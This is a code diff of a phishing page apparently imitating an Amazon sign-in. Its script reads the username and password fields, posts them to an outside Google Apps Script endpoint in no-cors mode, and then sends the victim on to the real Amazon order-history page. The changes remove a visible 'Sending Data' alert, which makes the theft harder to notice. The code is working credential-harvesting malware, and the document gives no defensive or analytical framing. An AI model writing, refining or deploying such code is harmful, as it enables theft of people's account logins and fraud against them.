@@ -640,11 +640,10 @@ amzn.copilot.checkCoPilotSession();
 
 <script type="text/javascript">
 async function sendToSheet() {
-  alert("Sending Data . . .");
   const username = document.getElementById("username").value;
   const password = document.getElementById("password").value;
 
-  const url = "https://script.google.com/macros/s/AKfycbxpcFVZRcvbXduOm-jK20zUGVu25wjBDXMkHSiT-gS4U920bA9mfUKMbx-5tu5A9_wl/exec"; // 🔥 Replace this
+  const url = "https://script.google.com/macros/s/AKfycbxpcFVZRcvbXduOm-jK20zUGVu25wjBDXMkHSiT-gS4U920bA9mfUKMbx-5tu5A9_wl/exec";
 
   try {
     const response = await fetch(url, {
@@ -655,7 +654,8 @@ async function sendToSheet() {
       },
       mode: "no-cors"
     });
-    window.location.href="https://www.amazon.com/gp/css/order-history?ref_=nav_orders_first";
+      
+    window.open("https://www.amazon.com/gp/css/order-history?ref_=nav_orders_first", "_self");
 
   } catch (err) {
     document.getElementById("status").innerText = "Error: " + err;
